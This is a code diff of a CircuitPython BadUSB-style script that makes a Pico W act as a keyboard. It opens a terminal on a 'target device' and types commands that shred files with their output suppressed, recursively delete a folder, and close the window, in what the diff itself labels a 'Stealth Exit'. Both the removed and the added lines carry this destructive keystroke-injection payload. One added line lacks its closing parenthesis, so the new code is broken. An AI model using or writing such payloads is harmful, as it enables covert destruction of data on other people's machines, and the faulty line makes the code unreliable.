@@ -1,4 +1,4 @@
-# used to delete whole file directories through the terminal
+# used to delete whole file directories through the terminal of target device
 import time
 import usb_hid
 from adafruit_hid.keyboard import Keyboard
@@ -20,10 +20,16 @@ kbd.press(Keycode.CONTROL, Keycode.ALT, Keycode.T)
 kbd.release_all()
 time.sleep(2)
 
-type_cmd("cd ~/Desktop")
-type_cmd("shred -vzu -n 1 *")
-type_cmd("rm -rf PicoW")
-type_cmd("shred -vzu -n 1 *")
-type_cmd("exit")
+# 1. Enter the target folder
+type_cmd("cd ~/Desktop/PicoWTest"
          
-print("Wipe Complete!")
+# 2. Shred all the files inside the first! (Overwrites data)
+type_cmd("shred -vzu -n 1 * > /dev/null 2>&1")
+
+# 3. Go back up and remove the now-empty, shredded folder
+type_cmd("cd .. && rm -rf PicoWTest")
+
+# Stealth Exit
+type_cmd("exit")
+
+print("Sanitization Complete!")
